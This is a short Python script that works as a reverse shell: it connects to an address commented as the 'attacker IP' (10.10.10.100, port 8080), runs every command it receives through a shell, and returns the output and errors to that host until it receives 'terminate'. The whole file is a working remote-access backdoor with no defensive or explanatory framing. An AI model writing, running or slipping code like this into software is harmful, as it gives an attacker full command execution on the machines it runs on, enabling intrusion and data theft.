#!/usr/bin/env python

import socket
import subprocess


def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.10.10.100', 8080)) # attacker IP.


	while True:	# keep receiving commands from attacker.
		command = s.recv(1024)

		if 'terminate' in command: # if we terminate, close the socket and break.
			s.close()
			break

		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send( CMD.stdout.read() ) # send back the resualt
			s.send( CMD.stderr.read() ) # send back the error
def main ():
	connect()
main()
